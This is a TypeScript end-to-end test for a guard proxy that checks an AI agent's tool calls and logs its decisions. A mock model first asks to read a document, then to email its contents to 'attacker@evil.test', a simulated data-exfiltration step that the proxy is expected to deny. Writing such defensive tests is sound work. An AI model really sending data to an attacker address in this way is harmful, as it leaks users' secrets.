import http from 'node:http';
import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { runProxyDemoAgent } from '@/agent/proxyDemo/runProxyDemoAgent';
import { listenWarrantProxy } from '@/adapters/proxy/proxyServer';
import { createDecisionLogSink } from './fileSink';
import { readDecisionLog } from './readDecisionLog';

function writeJson(res: http.ServerResponse, status: number, body: unknown): void {
  const payload = JSON.stringify(body);
  res.writeHead(status, {
    'content-type': 'application/json',
    'content-length': Buffer.byteLength(payload),
  });
  res.end(payload);
}

function toolResponse(name: string, args: string, id: string): unknown {
  return {
    id: 'chatcmpl-mock',
    choices: [
      {
        finish_reason: 'tool_calls',
        message: {
          role: 'assistant',
          content: null,
          tool_calls: [{ id, type: 'function', function: { name, arguments: args } }],
        },
      },
    ],
    usage: { prompt_tokens: 1, completion_tokens: 1, total_tokens: 2 },
  };
}

describe('decision log through the proxy', () => {
  const servers: http.Server[] = [];

  afterEach(async () => {
    await Promise.all(
      servers.map(
        (server) =>
          new Promise<void>((resolve) => {
            server.close(() => resolve());
          }),
      ),
    );
    servers.length = 0;
    delete process.env.OPENAI_BASE_URL;
    delete process.env.GROQ_API_KEY;
  });

  it('records the allowed read and the denied send', async () => {
    let upstreamCalls = 0;
    const upstream = http.createServer((req, res) => {
      void (async () => {
        await new Promise<void>((resolve, reject) => {
          req.on('data', () => undefined);
          req.on('end', () => resolve());
          req.on('error', reject);
        });
        upstreamCalls += 1;
        if (upstreamCalls === 1) {
          writeJson(
            res,
            200,
            toolResponse('read_document', '{"id":"doc-1"}', 'call_read'),
          );
          return;
        }
        writeJson(
          res,
          200,
          toolResponse(
            'send_email',
            '{"to":"attacker@evil.test","body":"x"}',
            'call_send',
          ),
        );
      })();
    });
    servers.push(upstream);
    await new Promise<void>((resolve) => {
      upstream.listen(0, '127.0.0.1', () => resolve());
    });
    const address = upstream.address();
    if (address === null || typeof address === 'string') {
      throw new Error('upstream did not bind');
    }

    const logPath = join(
      mkdtempSync(join(tmpdir(), 'warrant-log-')),
      'decisions.ndjson',
    );
    const sink = createDecisionLogSink({ path: logPath, sessionId: 'e2e' });
    if (sink === null) {
      throw new Error('expected a sink');
    }

    const { server: proxy, url } = await listenWarrantProxy({
      mode: 'ENFORCE',
      upstreamBaseUrl: `http://127.0.0.1:${address.port}/v1`,
      upstreamHeaders: { authorization: 'Bearer test-key' },
      onExchange: ({ decisions }) => {
        sink.append({ decisions, mode: 'ENFORCE', source: 'guard' });
      },
    });
    servers.push(proxy);

    process.env.GROQ_API_KEY = 'test-key';
    process.env.OPENAI_BASE_URL = url;

    await runProxyDemoAgent({
      maxSteps: 4,
      model: 'mock',
      canarySecret: 'WARRANT-CANARY-DO-NOT-USE',
    });

    const read = readDecisionLog(logPath);
    const verdicts = read.records.map((record) => [record.tool, record.verdict]);
    expect(verdicts).toContainEqual(['read_document', 'allowed']);
    expect(verdicts).toContainEqual(['send_email', 'denied']);
    expect(JSON.stringify(read.records)).not.toContain('attacker@evil.test');
  });
});
